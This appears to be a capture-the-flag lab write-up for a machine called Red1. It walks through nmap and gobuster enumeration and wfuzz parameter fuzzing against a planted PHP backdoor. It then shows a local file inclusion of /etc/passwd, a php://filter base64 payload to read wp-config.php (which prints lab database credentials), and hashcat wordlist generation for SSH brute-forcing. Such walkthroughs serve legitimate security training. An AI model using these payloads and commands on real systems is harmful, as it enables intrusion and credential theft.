# Red1
**IP: 10.0.4.7**
<br>
First of all I did an `nmap` scan and found that there are two open ports:<br>
> 80 _apache_ <br>
> 22 _ssh_

The site looks pretty simple. But I found some things in `robots.txt`<br>

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://redrocks.win/wp-sitemap.xml
```

I went to the sitemap and found that there is user named:
administrator

Checked it in the admin-login page and looks like it works.
<br>
Going to the site we know that there is a backdoor. The hacker said so.
<br>
Let's look for backdoors. We have a good wordlists with backdoor names in seclists.<br>
`gobuster dir -u http://10.0.4.7/ -w CommonBackdoors-PHP.fuzz.txt`<br>
Looks like we found one:<br>
```
/NetworkFileManagerPHP.php (Status: 500) [Size: 0]
```
There is nothing if we go there. Therefore, we can try to put there different requests like:<br>
`/NetworkFileManagerPHP.php?search=qwe`<br>
We can use `wfuzz` to do it.<br>
```
wfuzz -c -u "http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test" -w /usr/share/wfuzz/wordlist/general/big.txt --hh 00
```
We will find that the word `key` works.<br>
Try `http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd` and you will get a good result.

We know that this is a wordpress site. Also, we know that in wordpress sites have wp-config.php file where is a lot of interesting information. If we try to access it we won't see it since our browser automaticly translates php code. However, we can find a php base64 filter on PlayloadsAllTheThings. https://github.com/swisskyrepo/PayloadsAllTheThings 
Here is an example:<br>
```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
Modify it for ourselves:<br>
```
http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=wp-config.php
```
And it will give us a base64 string which we can decode and get the original wp-config.php code.<br>
Here is an interesting piece of code:<br>
```
...
/** MySQL database username */
define( 'DB_USER', 'john' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );
...
```
We know that there is the open ssh port. If we try to use these credentials to ssh it does not work.<br>
Also, we know that there is the backdoor file. Let's download it and look what it looks like.<br>
`http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php`<br>
Got a piece of code with another base64 line which says:<br>
`That password alone won't help you! Hashcat says rules are rules`<br>
And this is kind of hint.<br>
We know that `hashcat` is a tool for password bruteforcing. We can see the work "rules" in the text which brings an assumption that we need to use a rule. _That is where we need get acquainted with password cracking rules._ Also, we can make an assumption that the rules is best64, since our hint was encoded in base64.<br>
We are going to take the password that we found in `wp-config.php`, put it in fule `pwd.txt` and generate a custom wordlist with `hashcat` and rule called `best64`.<br>
Our command will look like this:<br>
```
hashcat pwd.txt -r /usr/share/hashcat/rules/best64.rule --stdout > custom_wordlist.txt
```
Now, we have got our custom wordlist. Let's try to bruteforce into `ssh`.



